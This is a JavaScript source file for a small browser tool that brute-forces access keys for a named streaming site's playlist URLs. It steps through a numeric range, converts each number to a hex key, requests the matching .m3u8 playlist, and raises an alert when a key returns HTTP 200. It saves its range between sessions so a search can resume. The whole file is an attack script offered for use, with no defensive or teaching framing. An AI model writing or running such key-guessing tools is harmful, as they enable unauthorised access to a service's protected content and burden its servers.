let fromInt = null;
let toInt = null;

let bruteTimer = null;
let currentKey = null;

async function main(){
	fromInt = document.getElementById("fromInt");
	toInt = document.getElementById("toInt");

	const [from, to] = restoreRangeFromStorage();

	fromInt.value = from;
	toInt.value = to;

	fromInt.onchange = rangeValueChanged.bind(window, fromInt, 'from')
	toInt.onchange = rangeValueChanged.bind(window, toInt, 'to')
}

function rangeValueChanged(target, suffix){
	localStorage.setItem(`248on_${suffix}_key`, target.value);
}

function restoreRangeFromStorage(){
	let [from, to] = [0, 4294967295];
	let tmp = null;

	tmp = localStorage.getItem("248on_from_key");
	if (tmp)
		from = Number(tmp)
	tmp = localStorage.getItem("248on_to_key");
	if (tmp)
		to = Number(tmp);

	return [from, to];
}

async function check248onStatus(key){
	return await fetch(`http://248on.com/playlist/${key}_otp_dev1.m3u8`)
	.then((response) => {
		return response.status;
	})
}

function toKey(number){
	return number.toString(16).padStart(6, '0');
}

function startBrute(){
	alert("start")
	if (bruteTimer === null){
		bruteTimer = setTimeout(doBruteCheck, 0);
	}
}

function stopBrute(){
	currentKey = null;
	clearTimeout(bruteTimer);
	bruteTimer = null;
}

function doBruteCheck(){
	const rebrute = () => {
		bruteTimer = setTimeout(doBruteCheck, 0);
	};

	if (currentKey === null)
		currentKey = Number(fromInt.value);
	else
		++currentKey;

	if (currentKey > Number(toInt.value)){
		stopBrute();
	}else{
		check248onStatus(toKey(currentKey))
		.then(code => {
			switch(code){
				case 200:
					alert("!The key is " + toKey(currentKey))
				break;
				case 403:
					rebrute();
				break;
			}
		})
		.catch( e => {
			stopBrute();
			alert("!Something unexpected happened")
		})
	}
}

window.onload=main;
